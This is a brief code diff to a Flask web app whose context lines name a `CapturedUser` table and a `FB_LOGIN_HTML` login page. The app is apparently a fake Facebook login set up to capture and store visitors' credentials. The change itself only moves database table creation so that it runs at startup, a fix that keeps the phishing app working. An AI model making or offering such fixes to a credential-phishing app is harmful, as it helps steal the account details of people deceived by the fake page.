@@ -16,6 +16,9 @@ app.config["SQLALCHEMY_DATABASE_URI"] = db_url
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 
 db = SQLAlchemy(app)
+with app.app_context():
+    db.create_all()
+  
 # Database Model
 class CapturedUser(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -247,9 +250,7 @@ def login():
         return render_template_string(FB_LOGIN_HTML)
 
     return render_template_string(FB_LOGIN_HTML)
-with app.app_context():
-    db.create_all()
-  
+
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
